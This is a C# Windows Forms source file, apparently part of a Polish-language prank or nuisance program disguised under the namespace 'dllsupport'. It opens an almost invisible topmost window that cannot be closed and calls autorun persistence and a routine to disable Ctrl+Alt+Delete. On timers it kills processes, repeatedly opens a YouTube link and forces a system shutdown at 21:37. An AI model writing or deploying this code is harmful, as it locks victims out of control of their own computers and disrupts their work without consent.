using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace dllsupport;

public class Fullscreen : Form
{
	public static int height = Screen.PrimaryScreen.Bounds.Height;

	public static int width = Screen.PrimaryScreen.Bounds.Width;

	public static int papieszInt = 0;

	public static Thread tackaThread = new Thread(Funkcje.wysuniecieTacki);

	public static Thread soundThread = new Thread(Funkcje.playSound);

	private IntPtr HWND_TOPMOST = new IntPtr(-1);

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	private const uint TOPMOST_FLAGS = 3u;

	private IContainer components = null;

	private System.Windows.Forms.Timer timerTacka;

	private System.Windows.Forms.Timer timerPapiesz;

	private System.Windows.Forms.Timer timerKillProcess;

	private System.Windows.Forms.Timer timerKremowka;

	private System.Windows.Forms.Timer timerURL;

	private System.Windows.Forms.Timer timerFormFocus;

	private System.Windows.Forms.Timer timerGodzina;

	[DllImport("user32.dll")]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetForegroundWindow(IntPtr hWnd);

	public Fullscreen()
	{
		InitializeComponent();
		SetWindowPos(base.Handle, HWND_TOPMOST, 0, 0, 0, 0, 3u);
		base.Location = new Point(0, 0);
		base.Size = new Size(width, height);
	}

	private void timerTacka_Tick(object sender, EventArgs e)
	{
		Funkcje.tackaBool = true;
	}

	private void timerPapiesz_Tick(object sender, EventArgs e)
	{
		Papiesz.generateForm();
		if (papieszInt == 4)
		{
			timerPapiesz.Stop();
		}
		papieszInt++;
	}

	private void timerKillProcess_Tick(object sender, EventArgs e)
	{
		KillProcess.kill();
		if (Papiesz.formFocus)
		{
			timerFormFocus.Start();
			Papiesz.formFocus = false;
		}
	}

	private void timerKremowka_Tick(object sender, EventArgs e)
	{
	}

	private void Fullscreen_Load(object sender, EventArgs e)
	{
		try
		{
            Funkcje.autorun(); 
            soundThread.Start();
			Funkcje.notifyIcon();
			SetWindowPos(base.Handle, HWND_TOPMOST, 0, 0, 0, 0, 3u);
			tackaThread.Start();
			timerTacka.Start();
			timerPapiesz.Start();
			timerKillProcess.Start();
			timerKremowka.Start();
			timerGodzina.Start();
			Funkcje.KillCtrlAltDelete(); 
		}
		catch
		{
		}
	}

	private void timerURL_Tick(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://www.youtube.com/watch?v=YR1afn8tfD0&list=RDYR1afn8tfD0&index=1");
		}
		catch
		{
		}
	}

	private void timerFormFocus_Tick(object sender, EventArgs e)
	{
		try
		{
			foreach (Form form in Papiesz.formList)
			{
				form.Focus();
			}
		}
		catch
		{
		}
	}

	private void timerGodzina_Tick(object sender, EventArgs e)
	{
		try
		{
			SetForegroundWindow(base.Handle);
			string strA = DateTime.Now.ToLongTimeString();
			if (string.Compare(strA, "21:37:00", ignoreCase: false) == 0)
			{
				Process.Start("shutdown", "-s");
			}
		}
		catch
		{
		}
	}

	private void Fullscreen_FormClosing(object sender, FormClosingEventArgs e)
	{
		e.Cancel = true;
		base.OnClosing(e);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(dllsupport.Fullscreen));
		this.timerTacka = new System.Windows.Forms.Timer(this.components);
		this.timerPapiesz = new System.Windows.Forms.Timer(this.components);
		this.timerKillProcess = new System.Windows.Forms.Timer(this.components);
		this.timerKremowka = new System.Windows.Forms.Timer(this.components);
		this.timerURL = new System.Windows.Forms.Timer(this.components);
		this.timerFormFocus = new System.Windows.Forms.Timer(this.components);
		this.timerGodzina = new System.Windows.Forms.Timer(this.components);
		base.SuspendLayout();
		this.timerTacka.Interval = 5000;
		this.timerTacka.Tick += new System.EventHandler(timerTacka_Tick);
		this.timerPapiesz.Interval = 1000;
		this.timerPapiesz.Tick += new System.EventHandler(timerPapiesz_Tick);
		this.timerKillProcess.Tick += new System.EventHandler(timerKillProcess_Tick);
		this.timerKremowka.Interval = 50000;
		this.timerKremowka.Tick += new System.EventHandler(timerKremowka_Tick);
		this.timerURL.Interval = 500000;
		this.timerURL.Tick += new System.EventHandler(timerURL_Tick);
		this.timerFormFocus.Tick += new System.EventHandler(timerFormFocus_Tick);
		this.timerGodzina.Tick += new System.EventHandler(timerGodzina_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
		base.ClientSize = new System.Drawing.Size(284, 261);
		base.ControlBox = false;
		this.Cursor = System.Windows.Forms.Cursors.WaitCursor;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Fullscreen";
		base.Opacity = 0.01;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Fullscreen";
		base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Fullscreen_FormClosing);
		base.Load += new System.EventHandler(Fullscreen_Load);
		base.ResumeLayout(false);
	}
}
